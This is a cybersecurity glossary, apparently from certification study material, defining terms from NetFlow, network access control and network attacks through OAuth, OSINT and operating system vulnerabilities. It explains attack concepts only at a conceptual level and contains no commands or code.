As distinct from network traffic monitoring, a network monitor (Auditing software that collects status and configuration information from network devices. Many products are based on the Simple Network Management Protocol SNMP) collects data about network infrastructure appliances, such as switches, access points, routers, firewalls. This is used to monitor load status for CPU/memory, state tables, disk capacity, fan speeds/temperature, network link utilization/error statistics, and so on. Another important function is a heartbeat message to indicate availability.

This data might be collected using the Simple Network Management Protocol (SNMP). An SNMP trap informs the management system of a notable event, such as port failure, chassis overheating, power failure, or excessive CPU utilization. The threshold for triggering traps can be set for each value. This provides a mechanism for alerts and alarms for hardware issues.

As well as supporting availability, network monitoring might reveal unusual conditions that could point to some kind of attack.

NetFlow
A flow collector is a means of recording metadata and statistics about network traffic rather than recording each frame. Network traffic and flow data may come from a wide variety of sources (or probes), such as switches, routers, firewalls, and web proxies. Flow analysis tools can provide features such as the following:

1. Highlighting of trends and patterns in traffic generated by particular applications, hosts, and ports.

2. Alerting based on detection of anomalies, flow analysis patterns, or custom triggers.

3. Visualization tools that show a map of network connections and make interpretation of patterns of traffic and flow data easier.

4. Identification of traffic patterns revealing rogue user behavior, malware in transit, tunneling, or applications exceeding their allocated bandwidth.

5. Identification of attempts by malware to contact a handler or command & control (C&C) channel.

NetFlow is a Cisco-developed means of reporting network flow information to a structured database. NetFlow has been redeveloped as the IP Flow Information Export (IPFIX - Standards-based version of the Netflow framework) IETF standard. A particular traffic flow can be defined by packets sharing the same characteristics, referred to as keys. A selection of keys is called a flow label, while traffic matching a flow label is called a flow record. A flow label is defined by packets that share the same key characteristics, such as IP source and destination addresses and protocol type. These five bits of information are referred to as a 5-tuple. A 5-tuple consists of:

1. Source address

2. Destination address

3. Protocol

4. Source port

5. Destination port

A 7-tuple adds the input interface and IP type of service data. Each exporter caches data for newly seen flows and sets a timer to determine flow expiration. When a flow expires or becomes inactive, the exporter transmits the data to a collector.
Monitoring Systems and Applications - Dashboards and reports also assist with real-time monitoring of host system and application/service status.

System Monitors and Logs
A system monitor (Software that tracks the health of a computer's subsystems using metrics reported by system hardware or sensors. This provides an alerting service for faults such as high temperature, chassis intrusion, and so on) implements the same functionality as a network monitor for a computer host. Like switches and routers, server hosts can report health status using SNMP traps.

Logs are one of the most valuable sources of security information. A system log can be used to diagnose availability issues. A security log can record both authorized and unauthorized uses of a resource or privilege. Logs function both as an audit trail of actions and (if monitored regularly) provide a warning of intrusion attempts. Log review is a critical part of security assurance. Only referring to the logs following a major incident is missing the opportunity to identify threats and vulnerabilities early and to respond proactively.

Logs typically associate an action with a particular user. This is one of the reasons why it is critical that users not share login details. If a user account is compromised, there is no means of tying events in the log to the actual attacker.

Application and Cloud Monitors
SNMP offers fairly limited functionality. There are numerous proprietary monitoring solutions for infrastructure, application, database, and cloud environments. Some are designed for on-premises and some for cloud, while some support hybrid monitoring of both types of environment. An application monitor will include a basic heartbeat test to verify that it is responding. Other factors to monitor include number of sessions and requests, bandwidth consumption, CPU and memory utilization, and error or security alert conditions. Cloud monitors will assess different facets of cloud services, such as network bandwidth, virtual machine status, and application health.

Vulnerability Scanners
A vulnerability scanner will report the total number of unmitigated vulnerabilities for each host. Consolidating these results can show the status of hosts across the whole network and highlight issues with a particular patch or configuration issue.

Antivirus
Most hosts should be running some type of antivirus scan (AV - Software capable of detecting and removing virus infections and (in most cases) other types of malware, such as worms, Trojans, rootkits, adware, spyware, password crackers, network mappers, DoS tools, and so on) software. While the A-V monitor remains popular, these suites are better conceived of as endpoint protection platforms (EPPs) or next-gen A-V. These detect malware by signature regardless of type, though detection rates can vary quite widely from product to product. Many suites also integrate with user and entity behavior analytics (UEBA) and use AI-backed analysis to detect threat actor behavior that has bypassed malware signature matching.

Antivirus will usually be configured to block a detected threat automatically. The software can be configured to generate a dashboard alert or log via integration with a SIEM.

Data Loss Prevention
Data loss prevention (DLP) mediates the copying of tagged data to restrict it to authorized media and services. As with antivirus scanning, monitoring statistics for DLP policy violations can show whether there are issues, especially where the results show trends over time.
Motivations of Threat Actors - Reasons behind cyber attacks, including financial gain, espionage, hacktivism, and revenge. Understanding threat actor motivations helps predict attack patterns and implement appropriate defenses. Motivation is the threat actor's reason for perpetrating the attack. A malicious threat actor could be motivated by greed, curiosity, or some grievance, for instance. Threats can be characterized as structured/targeted or unstructured/opportunistic, depending on how widely an attack is perpetrated.  For example, a criminal gang attempting to steal customers' financial data from a company's database system is a structured, targeted threat. An unskilled hacker launching some variant of the "I Love You" email worm sent to a stolen mailing list is an unstructured, opportunistic threat.
Multi-cloud Architecture - A cloud deployment model where the cloud consumer uses multiple public cloud services. Multi-cloud architectures are where an organization uses services from multiple CSPs.
Multi-Cloud Strategy - A multi-cloud strategy offers several benefits for both cybersecurity operations and business needs by leveraging the strengths of multiple cloud service providers. This approach enhances cybersecurity by diversifying the risk associated with a single point of failure, as vulnerabilities or breaches in one cloud provider's environment are less likely to compromise the entire infrastructure. Additionally, a multi-cloud strategy can improve security posture by implementing unique security features and services offered by different cloud providers. From a business perspective, a multi-cloud approach promotes vendor independence, reducing the risk of vendor lock-in and ensuring organizations can adapt to changing market conditions or technology trends. This strategy fosters healthy competition among cloud providers, often leading to more favorable pricing and better service offerings. Furthermore, a multi-cloud strategy enables organizations to optimize their IT infrastructure by selecting the most suitable cloud services for specific workloads or applications, enhancing performance and cost efficiency.

In a practical example of a multi-cloud strategy, a company operating a large e-commerce platform can distribute workloads across multiple cloud providers to address high availability, data security, performance optimization, and cost efficiency. By hosting the primary application infrastructure on one cloud provider and using another for backup and disaster recovery, the company ensures continuous operation even during outages. Storing sensitive customer data with a cloud provider that offers advanced security features and compliance certifications meets regulatory requirements. To address latency and performance concerns, the company can leverage a cloud provider with a global network of edge locations for content delivery and caching services. Finally, cost-effective storage and processing services can be used by another provider for big data analytics and reporting. This multi-cloud approach enables the e-commerce company to build a more resilient, secure, and efficient IT infrastructure tailored to their specific needs.
Multifactor Authentication (MFA) - An authentication scheme that requires the user to present at least two different factors as credentials; for example, something you know, something you have, something you are, something you do, and somewhere you are. Specifying two factors is known as "2FA."

Multifactor authentication requires a combination of different technologies. For example, requiring a PIN along with date of birth may be stronger than entering a PIN alone, but it is not multifactor.

You might also see references to two-factor authentication (2FA). This just means that there are precisely two factors involved, such as an ownership-based smart card or biometric identifier with something you know, such as a password or PIN.
Nation-state - A type of threat actor that is supported by the resources of its host country's military and security services. Most nation-states have developed cybersecurity expertise and will use cyber weapons to achieve military and commercial goals. The security company Mandiant's APT1 report into Chinese cyber espionage units shaped the language and understanding of cyber-attack lifecycles. Nation-state actors have been implicated in many attacks, particularly on energy, health, and electoral systems. The goals of state actors are primarily disinformation and espionage for strategic advantage, but it is known for countries—North Korea being a good example—to target companies for financial gain. State actors will work at arm's length from the national government, military, or security service that sponsors and protects them, maintaining "plausible deniability." They are likely to pose as independent groups or even as hacktivists. They may wage false flag disinformation campaigns that try to implicate other states.
National Institute of Standards and Technology (NIST) - Develops computer security standards used by US federal agencies and publishes cybersecurity best practice guides and research.
Near-field Communication (NFC) - A standard for two-way radio communications over very short (around four inches) distances, facilitating contactless payment and similar technologies. NFC is based on RFID.
NetFlow - Cisco-developed means of reporting network flow information to a structured database. NetFlow allows better understanding of IP traffic flows as used by different network applications and hosts.

A flow collector is a means of recording metadata and statistics about network traffic rather than recording each frame. Network traffic and flow data may come from a wide variety of sources (or probes), such as switches, routers, firewalls, and web proxies. Flow analysis tools can provide features such as the following:

1. Highlighting of trends and patterns in traffic generated by particular applications, hosts, and ports.

2. Alerting based on detection of anomalies, flow analysis patterns, or custom triggers.

3. Visualization tools that show a map of network connections and make interpretation of patterns of traffic and flow data easier.

4. Identification of traffic patterns revealing rogue user behavior, malware in transit, tunneling, or applications exceeding their allocated bandwidth.

5. Identification of attempts by malware to contact a handler or command & control (C&C) channel.

NetFlow is a Cisco-developed means of reporting network flow information to a structured database. NetFlow has been redeveloped as the IP Flow Information Export (IPFIX - Standards-based version of the Netflow framework) IETF standard. A particular traffic flow can be defined by packets sharing the same characteristics, referred to as keys. A selection of keys is called a flow label, while traffic matching a flow label is called a flow record. A flow label is defined by packets that share the same key characteristics, such as IP source and destination addresses and protocol type. These five bits of information are referred to as a 5-tuple. A 5-tuple consists of:

1. Source address

2. Destination address

3. Protocol

4. Source port

5. Destination port

A 7-tuple adds the input interface and IP type of service data. Each exporter caches data for newly seen flows and sets a timer to determine flow expiration. When a flow expires or becomes inactive, the exporter transmits the data to a collector.
Network Access Control (NAC) - Network access control (NAC - A general term for the collected protocols, policies, and hardware that authenticate and authorize access to a network at the device level) not only authenticates users and devices before allowing them access to the network but also checks and enforces compliance with established security policies. By evaluating the operating system version, patch level, antivirus status, or the presence of specific security software, NAC ensures that devices meet a minimum set of security standards before being granted network access. NAC also can restrict access based on user profile, device type, location, and other attributes, to ensure users and devices can only access the resources necessary to complete their duties. NAC plays a crucial role in identifying and quarantining suspicious or noncompliant devices. For organizations with bring-your-own-device (BYOD) policies and increasing use of IoT devices, NAC helps organizations secure their internal network environment against unauthorized access.

NAC and virtual local area networks (VLANs) work together to improve and automate network security. One of the primary ways NAC integrates with VLAN protections is through dynamic VLAN assignment. Dynamic VLAN assignment is a NAC feature that assigns a VLAN to a device based on the user's identity attributes, device type, device location, or health check results. For instance, a visiting user (such as a vendor) might be placed into a VLAN that only provides Internet access, while a corporate user would be assigned to a VLAN with access to internal resources. Additionally, NAC can interact with dynamic VLAN to implement quarantine procedures. If a device is noncompliant with security policies—for example, if it lacks updated antivirus software—the NAC system can automatically move it to a quarantine VLAN. This VLAN is generally isolated from the rest of the network, limiting potential damage from threats like malware.

Agent vs. Agentless Configurations
NAC can enforce security policies using agent-based and agentless methods. In an agent-based approach, a software agent is installed on the devices that connect to the network. This agent communicates with the NAC platform, providing detailed information about the device's status and compliance level. An agent-based NAC implementation can enable features such as automatic remediation, where the NAC agent can perform actions like updating software or disabling specific settings to bring a device into compliance with mandatory security configurations.

In contrast, an agentless NAC approach uses port-based network access control or network scans to evaluate devices. For example, agentless NAC may use DHCP fingerprinting to identify the type and configuration of a device when it connects, or it might perform a network scan to detect open ports or active services. While agentless methods may not provide as detailed information about a device's status, they can be used with any device that connects to the network, including guest or IoT devices, without requiring any prior configuration.

An agent can be persistent, in which case it is installed as a software application on the client, or nonpersistent. A nonpersistent (or dissolvable) agent is loaded into memory during posture assessment but is not installed on the device.
Network Architecture - Network architecture means the selection and placement of media, devices, protocols/services, and data assets:

1. Network infrastructure is the media, appliances, and addressing/forwarding protocols that support basic connectivity.
2. Network applications are the services that run on the infrastructure to support business activities, such as processing invoices or sending email.
3. Data assets are the information that is created, stored, and transferred as a result of business activity.
Network Architecture Weaknesses - Weaknesses in the network architecture make it more susceptible to undetected intrusions or to catastrophic service failures. Typical weaknesses include the following:

1. Single points of failure - A "pinch point" relying on a single hardware server or appliance or network channel.

2. Complex dependencies - Services that require many different systems to be available. Ideally, the failure of individual systems or services should not affect the overall performance of other network services.

3. Availability over confidentiality and integrity - Often it is tempting to take "shortcuts" to get a service up and running. Compromising security might represent a quick fix but creates long-term risks.

4. Lack of documentation and change control - Network segments, appliances, and services might be added without proper change control procedures, leading to a lack of visibility into how the network is constituted. It is vital that network managers understand business workflows and the network services that underpin them.

5. Overdependence on perimeter security - If the private network architecture is "flat" (that is, if any host can contact any other host), penetrating the network edge gives the attacker freedom of movement.
Network Attack Surface - The network attack surface is all the points at which a threat actor could gain access to hosts and services. It is helpful to use the layer model to analyze the potential attack surface:

1. Layer 1/2 - Allows unauthorized hosts to connect to wall ports or wireless networks and communicate with hosts within the same broadcast domain.

2. Layer 3 - Allows unauthorized hosts to obtain a valid network address, possibly by spoofing, and communicate with hosts in other zones.

3. Layer 4/7 - Allows unauthorized hosts to establish connections to TCP or UDP ports and communicate with application layer protocols and services.
Network Attacks - An attack directed against cabled and/or wireless network infrastructure, including reconnaissance, denial of service, credential harvesting, on-path, privilege escalation, and data exfiltration.

A network attack is a general category for a number of strategies and techniques that threat actors use to either disrupt or gain access to systems via a network vector. Network attack analysis is usually informed by considering the place each attack type might have within an overall cyberattack lifecycle:

1. Reconnaissance - Is where a threat actor uses scanning tools to learn about the network. Host discovery identifies which IP addresses are in use. Service discovery identifies which TCP or UDP ports are open on a given host. Fingerprinting identifies the application types and versions of the software operating each port, and potentially of the operating system running on the host, and its device type. Rapid scanning generates a large amount of distinctive network traffic that can be detected and reported as an intrusion event, but it is very difficult to differentiate malicious scanning activity from non-malicious scanning activity.

2. Credential Harvesting - Is a type of reconnaissance where the threat actor attempts to learn passwords or cryptographic secrets that will allow them to obtain authenticated access to network systems.

3. Denial of Service (DoS) - In a network context refers to attacks that cause hosts and services to become unavailable. This type of attack can be detected by monitoring tools that report when a host or service is not responding, or is suffering from abnormally high volumes of requests. A DoS attack might be launched as an end in itself, or to facilitate the success of other types of attacks.

4. Weaponization, Delivery, and Breach - Refer to techniques that allow a threat actor to get access without having to authenticate. This typically involves various types of malicious code being directed at a vulnerable application host or service over the network, or sending code concealed in file attachments, and tricking a user into running it.

5. Command and Control (C2 or C&C), Beaconing, and Persistence - Refer to techniques and malicious code that allow a threat actor to operate a compromised host remotely, and maintain access to it over a period of time. The threat actor has to disguise the incoming command and outgoing beaconing activity as part of the network's regular traffic, such as by using encrypted HTTPS connections. Detection of this type of activity usually depends on identifying anomalous connection endpoints, such as connections to IP addresses in countries that do not respect copyright or privacy laws. There can also be indicators on the compromised host, such as the malware itself and unauthorized startup items.

6. Lateral movement, Pivoting, and Privilege Escalation - Refer to techniques that allow the threat actor to move from host to host within a network or from one network segment to another, and to obtain wider and higher permissions for systems and services across the network. These types of attacks are detected via anomalous account logins and privilege use, but detection usually depends on machine learning-backed software, as it is typically difficult to differentiate anomalous behavior from normal behavior.

7. Data Exfiltration - Refers to obtaining an information asset and copying it to the attacker's remote machine. Anomalous large data transfers might be an indicator for exfiltration, but a threat actor could perform the attack stealthily, by only moving small amounts of data at any one time.

Note that stages in the lifecycle are iterative. For example, a threat actor might perform external reconnaissance and credential harvesting or breach to obtain an initial foothold. They might then perform reconnaissance and credential harvesting from the foothold to perform lateral movement and privilege escalation on internal hosts.
Network Behavior and Anomaly Detection (NBAD) - A security monitoring tool that monitors network packets for anomalous behavior based on known signatures.

Historically, network behavior and anomaly detection (NBAD) products provide this type of detection. An NBAD engine uses heuristics (meaning to learn from experience) to generate a statistical model of what baseline normal traffic looks like. It may develop several profiles to model network use at different times of the day. This means that the system generates false positives and false negatives until it has had time to improve its statistical model of what is "normal." A false positive is where legitimate behavior generates an alert, while a false negative is where malicious activity is not alerted.

While NBAD products were relatively unsophisticated, using machine learning in more recent products has made them more productive. As identified by Gartner's market analysis (gartner.com/en/documents/3917096/market-guide-for-user-and-entity-behavior-analytics), there are two general classes of behavior-based detection products that utilize machine learning:

1. User and Entity Behavior Analytics (UEBA) - Are products that scan indicators from multiple intrusion detection and log sources to identify anomalies. They are often integrated with security information and event management (SIEM) platforms.

2. Network Traffic Analysis (NTA) - Are products similar to IDS and NBAD in that they apply analysis techniques only to network streams rather than multiple network and log data sources.

Often behavioral- and anomaly-based detection are taken to mean the same thing (in the sense that the engine detects anomalous behavior). This may not always be the case. Anomaly-based detection can also mean specifically looking for irregularities in the use of protocols. For example, the engine may check packet headers or the exchange of packets in a session against RFC standards and generate an alert if they deviate from strict RFC compliance.
Network Data Sources - Network appliances generate their own system and security/audit logs, but there are other sources of network security data that can be useful for an investigation.

Network Logs
Network logs (A target for system and access events generated by a network appliance, such as a switch, wireless access point, or router) are generated by appliances such as routers, firewalls, switches, and access points. Log files will record the operation and status of the appliance itself—the system log for the appliance—plus traffic and access logs recording network behavior. For example, network appliance access logs might reveal the following types of threat:

1. A switch log might reveal an endpoint trying to use multiple MAC addresses to perpetrate an on-path attack.

2. A firewall log might identify scanning activity on a blocked port.

3. An access point log could record disassociation events that indicate a threat actor trying to attack the wireless network.

Firewall Logs
Any firewall rule can be configured to generate an event whenever it is triggered. As with most types of security data, this can quickly generate an overwhelming number of events. It is also possible to configure log-only rules. Typically, firewall logging (A target for event data related to access rules that have been configured for logging) will be used when testing a new rule or only enabled for high-impact rules.

A firewall audit event will record a date/timestamp, the interface on which the rule was triggered, whether the rule matched incoming/ingress or outgoing/egress traffic, and whether the packet was accepted or dropped. The event data will also record packet information, such as source and destination address and port numbers. This information can support investigation of host compromise. For example, say that a host-based IDS reports that a malicious process on a local server is attempting to connect to a particular port on an Internet host. The firewall log could confirm whether the connection was allowed or denied and identify which rule potentially needs adjusting.

IPS/IDS Logs
An IPS/IDS log is an event when a traffic pattern is matched to a rule. As this can generate a very high volume of events, it might be appropriate to only log high sensitivity/impact rules. As with firewall logging, a single packet might trigger multiple rules.

An intrusion prevention system could additionally be configured to log shuns, resets, and redirects in the same way as a firewall.

As with endpoint protection logs, summary event data from IDS/IPS can be visualized in dashboard graphs to represent overall threat levels. Close analysis of detection events can assist with attributing intrusion events to a specific actor and developing threat intelligence of TTPs.
Network Logs - A target for system and access events generated by a network appliance, such as a switch, wireless access point, or router.

Network logs are generated by appliances such as routers, firewalls, switches, and access points. Log files will record the operation and status of the appliance itself—the system log for the appliance—plus traffic and access logs recording network behavior. For example, network appliance access logs might reveal the following types of threat:

1. A switch log might reveal an endpoint trying to use multiple MAC addresses to perpetrate an on-path attack.

2. A firewall log might identify scanning activity on a blocked port.

3. An access point log could record disassociation events that indicate a threat actor trying to attack the wireless network.
Network Monitor - Auditing software that collects status and configuration information from network devices. Many products are based on the Simple Network Management Protocol (SNMP).
Next-Generation Firewall (NGFW) - Advances in firewall technology, from app awareness, user-based filtering, and intrusion prevention to cloud inspection.

While intrusion detection was originally produced as stand-alone software or appliances, its functionality quickly became incorporated into a new generation of firewalls. The original next-generation firewall (NGFW) was released in 2010 by Palo Alto. There is no official specification for what an NGFW can do, but the following features are typical:

1. Layer 7 application-aware filtering, including inspection of Transport Layer Security (TLS) encrypted traffic.

2. Integration with network directories, facilitating per-user or per-role content and time-based filtering policies, providing better protection against an insider threat.

3. Intrusion prevention system (IPS) functionality. Next-generation firewalls can combine traditional firewall functionalities with advanced capabilities, such as deep packet inspection, intrusion prevention, and application awareness.

4. Integration with cloud networking.
NIST Cybersecurity Framework - The NIST Cybersecurity Framework provides a policy framework of computer security guidance for how private sector organizations can assess and improve their ability to prevent, detect, and respond to cyber attacks. It consists of five core functions: Identify, Protect, Detect, Respond, and Recover.

1. Identify - Develop security policies and capabilities. Evaluate risks, threats, and vulnerabilities and recommend security controls to mitigate them.

2. Protect - Procure/develop, install, operate, and decommission IT hardware and software assets with security as an embedded requirement of every stage of this operation's lifecycle.

3. Detect - Perform ongoing, proactive monitoring to ensure that controls are effective and capable of protecting against new types of threats.

4. Respond - Identify, analyze, contain, and eradicate threats to systems and data security.

5. Recover - Implement cybersecurity resilience to restore systems and data if other controls are unable to prevent attacks.
Non-Credentialed Scan - A scan that uses fewer permissions and many times can only find missing patches or updates.

A non-credentialed scan is one that proceeds by directing test packets at a host without being logged on to the OS or application. The view is the one the host exposes to an unprivileged user on the network. The test routines may be able to include things such as using default passwords for service accounts and device management interfaces, but they are not given privileged access. While you may discover more weaknesses with a credentialed scan, you will sometimes want to narrow your focus to that of an attacker who doesn't have specific high-level permissions or total administrative access. Non-credentialed scanning is the most appropriate technique for external assessment of the network perimeter or when performing web application scanning.
Non-Human-Readable Data - Information stored in a file that human beings cannot read without a specialized processor to decode the binary or complex structure.

Non-human-readable data refers to data that is not easily understood or interpreted by humans in its raw form. It may be in a machine-readable format, such as binary code, encrypted data, or data represented in a complex structure or encoding that requires specialized software or algorithms to decipher and interpret. Non-human-readable data often requires additional processing or transformation to make it understandable to humans.

Human-readable and non-human-readable data formats have distinct implications for security operations and controls. Human-readable and non-human-readable data formats impact security operations and controls in different ways. Security monitoring, user awareness, DLP, content filtering, and web security are more directly applicable to human-readable data formats.

On the other hand, encryption, access controls, intrusion detection and prevention, secure data exchange, and code/application security are more relevant to non-human-readable data formats. It is important to note that non-human-readable data formats can impede the capabilities of security controls because non-human-readable data formats cannot be easily interpreted using traditional methods and require specialized approaches to inspect and protect them. A comprehensive security approach considers both types of data formats and implements appropriate measures to protect them based on their characteristics and associated risks.
Non-repudiation - The security goal of ensuring that the party that sent a transmission or created data remains associated with that data and cannot deny sending or creating that data. Non-repudiation means that a person cannot deny doing something, such as creating, modifying, or sending a resource. For example, a legal document, such as a will, must usually be witnessed when it is signed. If there is a dispute about whether the document was correctly executed, the witness can provide evidence that it was.
Nondisclosure Agreement (NDA) - An agreement that stipulates that entities will not share confidential information, knowledge, or materials with unauthorized third parties. Ensures the confidentiality and protection of sensitive information shared during the relationship. An NDA is a binding agreement and likely to be signed alongside an MOU.
NT LAN Manager (NTLM) Authentication - A challenge-response authentication protocol created by Microsoft for use in its products.
Obfuscation - A technique that essentially "hides" or "camouflages" code or other information so that it is harder to read by unauthorized users.

Obfuscation is the art of making a message or data difficult to find. It is security by obscurity, which is normally deprecated.
Off-site Backup - Backup that writes job data to media that is stored in a separate physical location to the production system.

The need for on-site and off-site backups must be balanced, as they are crucial in securing critical data and ensuring business continuity. On-site backups involve storing data locally (in the same location as the protected systems) on devices such as hard drives or tapes to provide rapid access and recovery in case of data loss, corruption, or system failures. On the other hand, off-site backups involve transferring data to a remote location to ensure protection against natural disasters, theft, and other physical threats to local infrastructure, as well as catastrophic system loss that can result from ransomware infection, for example.

Ransomware poses a significant threat to businesses and organizations by encrypting vital data and demanding a ransom for its release. In many cases, ransomware attacks also target backup infrastructure, hindering recovery efforts and further exacerbating the attack's impact. Perpetrators often employ advanced techniques to infiltrate and compromise both primary and backup systems, rendering them useless when needed. Organizations can implement several strategies to defend against this risk, such as maintaining air-gapped backups physically disconnected from the network, thereby actively preventing ransomware from accessing and encrypting them.
Offboarding - The process of ensuring that all HR and other requirements are covered when an employee leaves an organization.
Offensive Penetration Testing - The "hostile" or attacking team in a penetration test or incident response exercise.

Offensive penetration testing, often called "Red Teaming," is a proactive and controlled approach to simulate real-world cyberattacks on an organization's systems, networks, and applications. The primary goal of offensive penetration testing is to identify vulnerabilities, weaknesses, and potential attack vectors that malicious actors could exploit. This testing is typically performed by skilled and ethical cybersecurity professionals who mimic potential attackers' tactics, techniques, and procedures (TTPs).
Offline Password Attack - An offline attack means that the attacker has managed to obtain a database of password hashes, such as %SystemRoot%\System32\config\SAM , %SystemRoot%\NTDS\NTDS.DIT (the Active Directory credential store) or /etc/shadow . Once the password database has been obtained, the cracker does not interact with the authentication system. The only indicator of this type of attack (other than misuse of the account in the event of a successful attack) is a file system audit log that records the malicious account accessing one of these files. Threat actors can also read credentials from host memory, in which case the only reliable indicator might be the presence of attack tools on a host.

If the attacker cannot obtain a database of passwords, a packet sniffer might be used to obtain the client response to a server challenge in an authentication protocol. Some protocols send the hash directly; others use the hash to derive an encryption key. Weaknesses in protocols using derived keys can allow for the extraction of the hash for cracking.
On-Path Attack / Man-in-the-Middle Attack (MiTM) - An attack where the threat actor makes an independent connection between two victims and is able to read and possibly modify traffic.

An on-path attack is where the threat actor gains a position between two hosts, and transparently captures, monitors, and relays all communication between them. Because the threat actor relays the intercepted communications, the hosts might not be able to detect the presence of the threat actor. An on-path attack could also be used to covertly modify the traffic. For example, an on-path host could present a workstation with a spoofed website form to try to capture the user credential. This attack is also referred to as an adversary-in-the-middle (AitM) attack.

On-path attacks can be launched at any network layer. One infamous example attacks the way layer 2 forwarding works on local segments. The Address Resolution Protocol (ARP) identifies the MAC address of a host on the local segment that owns an IPv4 address. An ARP poisoning attack uses a packet crafter, such as Ettercap, to broadcast unsolicited ARP reply packets. Because ARP has no security mechanism, the receiving devices trust this communication and update their MAC:IP address cache table with the spoofed address.

The usual target will be the subnet's default gateway (the router that accesses other networks). If the ARP poisoning attack is successful, all traffic destined for remote networks will be received by the attacker, implementing an on-path attack.
On-premises Network - A private network facility that is owned and operated by an organization for use by its employees only. An on-premises network is one installed to a single site and operated by a single company. This can also be referred to as an enterprise local area network (LAN).
On-site Backup - Backup that writes job data to media that is stored in the same physical location as the production system.

The need for on-site and off-site backups must be balanced, as they are crucial in securing critical data and ensuring business continuity. On-site backups involve storing data locally (in the same location as the protected systems) on devices such as hard drives or tapes to provide rapid access and recovery in case of data loss, corruption, or system failures. On the other hand, off-site backups involve transferring data to a remote location to ensure protection against natural disasters, theft, and other physical threats to local infrastructure, as well as catastrophic system loss that can result from ransomware infection, for example.

Ransomware poses a significant threat to businesses and organizations by encrypting vital data and demanding a ransom for its release. In many cases, ransomware attacks also target backup infrastructure, hindering recovery efforts and further exacerbating the attack's impact. Perpetrators often employ advanced techniques to infiltrate and compromise both primary and backup systems, rendering them useless when needed. Organizations can implement several strategies to defend against this risk, such as maintaining air-gapped backups physically disconnected from the network, thereby actively preventing ransomware from accessing and encrypting them.
Onboarding - The process of bringing in a new employee, contractor, or supplier.
Online Certificate Status Protocol (OCSP) - Allows clients to request the status of a digital certificate, to check whether it is revoked.

A means of providing up-to-date information is to check the certificate's status on an Online Certificate Status Protocol (OCSP) server . Rather than return a whole CRL, this communicates requested certificate's status. Details of the OCSP responder service should be published in the certificate.

Most OCSP servers can query the certificate database directly and obtain the real-time status of a certificate. Other OCSP servers actually depend on the CRLs and are limited by the CRL publishing interval.
Online Password Attack - An online password attack is where the threat actor interacts with the authentication service directly—a web login form or VPN gateway, for instance. An online password attack can show up in audit logs as repeatedly failed logins and then a successful login, or as successful login attempts at unusual times or locations. Apart from ensuring the use of strong passwords by users, online password attacks can be mitigated by restricting the number or rate of login attempts, and by shunning login attempts from known bad IP addresses.

Note that restricting logins can be turned into a vulnerability as it exposes the account to denial of service attacks. The attacker keeps trying to authenticate, locking out valid users.
Opal - Standards for implementing device encryption on storage devices.
Open Authorization (OAuth) - A standard for federated identity management, allowing resource servers or consumer sites to work with user accounts created and managed on a separate identity provider. OAuth uses the JavaScript Object Notation (JSON) Web Token (JWT) format for claims data.

Many public clouds use application programming interfaces (APIs) based on Representational State Transfer (REST) rather than SOAP. These are called RESTful APIs. Where SOAP is a tightly specified protocol, REST is a looser architectural framework. This allows the service provider more choice over implementation elements. Compared to SOAP and SAML, there is better support for mobile apps.

Authentication and authorization for a RESTful API are often implemented using the Open Authorization (OAuth) protocol. OAuth is designed to facilitate sharing of information (resources) within a user profile between sites. The user creates a password-protected account at an identity provider (IdP). The user can link that identity to an OAuth consumer site without giving the password to the consumer site. A user (resource owner) can grant an OAuth client authorization to access some part of their account. A client in this context is an app or consumer site.

The user account is hosted by one or more resource servers. A resource server is called an API server because it hosts the functions that allow OAuth clients (consumer sites and mobile apps) to access user attributes. An authorization server processes authorization requests. A single authorization server can manage multiple resource servers; equally, the resource and authorization server could be the same server instance.

The client app or service must be registered with the authorization server. As part of this process, the client registers a redirect URL, which is the endpoint that will process authorization tokens. Registration also provides the client with an ID and a secret. The ID can be publicly exposed, but the secret must be kept confidential between the client and the authorization server. When the client application requests authorization, the user approves the authorization server to grant the request using an appropriate method. OAuth supports several grant types—or flows—for use in different contexts, such as server to server or mobile app to server. Depending on the flow type, the client will end up with an access token validated by the authorization server. The client presents the access token to the resource server, which then accepts the request for the resource if the token is valid.

OAuth uses the JavaScript Object Notation (JSON) Web Token (JWT) format for claims data. JWTs can be passed as Base64-encoded strings in URLs and HTTP headers and can be digitally signed for authentication and integrity.
Open Public Ledger - Distributed public record of transactions that underpins the integrity of blockchains.

This ledger does not exist as an individual file on a single computer; rather, one of the most important characteristics of a blockchain is that it is decentralized. The ledger is distributed across a peer-to-peer (P2P) network in order to mitigate the risks associated with having a single point of failure or compromise.
Open Service Port (Network Vector) - The threat actor is able to establish an unauthenticated connection to a logical TCP or UDP network port. The server will run an application to process network traffic arriving over the port. The software might be vulnerable to exploit code or to service disruption. Servers have to open necessary ports to make authorized network applications and services work. However, as part of reducing the attack surface, servers should not be configured to allow traffic on any unnecessary ports. Networks can use secure design principles, access control, firewalls, and intrusion detection to reduce the attack surface.
Open-Source Intelligence (OSINT) - Publicly available information plus the tools used to aggregate and search it.

Open-source intelligence (OSINT) describes collecting and analyzing publicly available information and using it to support decision-making. In cybersecurity operations, OSINT is used to identify vulnerabilities and threat information by gathering data from many sources such as blogs, forums, social media platforms, and even the dark web. This can include information about new types of malware, attack strategies used by cybercriminals, and recently discovered software vulnerabilities. Security researchers can use OSINT tools to automatically collect and analyze this information, identifying potential threats or vulnerabilities that could impact their organization.

OSINT involves collecting data from publicly accessible sources. The deep web consists of databases and other content not indexed by traditional search engines, which can provide valuable insights into potential threats.

Some common OSINT tools include Shodan for investigating Internet-connected devices, Maltego for visualizing complex networks of information, Recon-ng for web-based reconnaissance activities, and theHarvester for gathering emails, subdomains, hosts, and employee names from different public sources.

The OSINT Framework is a useful resource designed to help locate and organize tools used to perform open-source intelligence.

OSINT can provide valuable context to aid in assessing risk levels associated with a specific vulnerability. For example, newly discovered vulnerabilities that are being actively exploited in the wild or discussed in hacking forums will need to be prioritized for remediation. In this way, OSINT helps identify vulnerabilities and plays a critical role in vulnerability management and threat assessment.
Operating System Vulnerabilities - Operating systems (OS) are one of the most critical components of any infrastructure, so vulnerabilities in an OS can lead to significant problems when successfully exploited.

Microsoft Windows has an extensive feature set and broad user base, especially among large organizations and governments. Its vulnerabilities often include buffer overflows, input validation problems, and privilege flaws typically exploited to install malware, steal information, or gain unauthorized access. Windows is an important target for attackers because of its large install base. Large corporations and governments heavily depend upon it which compounds the significance of its vulnerabilities.

Apple's macOS vulnerabilities often stem from its UNIX-based architecture, and weaknesses generally appear in access controls, secure boot processes, and third-party software. Apple macOS has a smaller user base than Windows, but its popularity has grown significantly. Generally, macOS is perceived as being 'safer' than other operating systems, which can lead to complacency.

